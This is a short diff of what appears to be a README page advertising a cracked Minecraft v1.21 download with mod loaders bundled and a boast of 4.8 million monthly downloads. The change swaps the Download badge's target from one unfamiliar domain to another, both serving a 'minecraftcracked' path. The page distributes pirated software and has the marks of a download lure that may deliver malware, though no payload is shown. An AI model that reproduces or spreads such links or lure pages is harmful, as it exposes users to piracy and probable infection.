@@ -49,7 +49,7 @@ A: Yes — Forge and Fabric mod loaders pre-installed.
 
 **Monthly downloads:** 4.8m+
 
-[![Download](https://img.shields.io/badge/Download-v1.21-brightgreen?style=for-the-badge)](https://dllvcrun.com/minecraftcracked)
+[![Download](https://img.shields.io/badge/Download-v1.21-brightgreen?style=for-the-badge)](https://p-csx-5.com/minecraftcracked)
 
 ---
 
